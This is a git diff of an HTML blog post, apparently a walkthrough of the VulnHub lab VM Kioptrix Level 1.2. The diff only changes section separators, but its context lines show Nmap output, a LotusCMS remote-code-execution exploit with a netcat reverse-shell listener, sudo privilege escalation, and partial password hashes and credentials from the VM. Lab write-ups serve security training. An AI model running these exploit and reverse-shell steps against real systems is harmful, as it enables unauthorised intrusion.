@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190928_vulnhub-kioptrix2.html"> « </a>📅 published on <code>29/Sep/2019</code><a href="/posts/20191008_vulnhub-kioptrix4.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix3/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix3/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_lotuscms">exploit_lotuscms</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Sat Sep 28 20:47:08 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/xml/_quick_tcp_nmap.xml 192.168.92.184
 Nmap scan report for 192.168.92.184
@@ -101,7 +101,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>lotuscms: dreg, loneferret
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We find a remote code execution <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">exploit on GitHub</a> for <code>LotusCMS</code> and decide to use it. This exploit gives us a reverse shell that we can catch using <code>netcat</code>:  </p>
 <pre class="nested"><code>nc -nlvp 443
 ./lotusRCE.sh kioptrix3.com
@@ -113,7 +113,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ssh loneferret@192.168.92.184
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot06.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>loneferret@Kioptrix3&gt; id
 uid=1000(loneferret) gid=100(users) groups=100(users)
 loneferret@Kioptrix3&gt;  
@@ -132,7 +132,7 @@ root
 loneferret
 dreg
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We continue as user <code>loneferret</code> since this user has an interesting <code>sudo</code> entry:  </p>
 <pre class="nested"><code>sudo -l
   User loneferret may run the following commands on this host:
@@ -151,7 +151,7 @@ dreg
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot09.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot10.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:............
 loneferret:$1$qbkHf53U$r.kK/JgDLDcXGRC6xUfB11:15079.............
@@ -162,7 +162,7 @@ dreg:$1$qAc2saWZ$Y567sEs.ql3GMttI6pvoe0:15080:............
 mysql: root/fucke...
 ssh: dreg/Mas..., loneferret/star....
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a>  </li>
 <li><a href="https://v3ded.github.io/ctf/kioptrix3.html">https://v3ded.github.io/ctf/kioptrix3.html</a>  </li>
